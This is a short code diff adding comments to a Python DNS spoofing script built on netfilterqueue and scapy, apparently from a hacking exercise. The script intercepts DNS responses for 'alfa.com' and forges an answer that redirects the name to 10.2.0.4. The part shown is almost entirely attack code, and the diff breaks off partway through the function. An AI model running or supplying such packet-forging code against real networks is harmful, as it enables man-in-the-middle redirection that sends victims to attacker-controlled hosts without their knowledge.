@@ -3,10 +3,16 @@ import netfilterqueue
 import scapy.all as scapy
 
 
+# processing packet for further changes, like now we are redirecting to another IP
 def process_packet(packet):
+    # loading  packet with scapy
     scapy_packet = scapy.IP(packet.get_payload())
+
+    # check scapy packet if it has dns request
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
+
+        # check if the request contain website we want to spoof
         if "alfa.com" in str(qname):
             print('[+] Spoofing target')
             answer = scapy.DNSRR(rrname=qname, rdata="10.2.0.4")
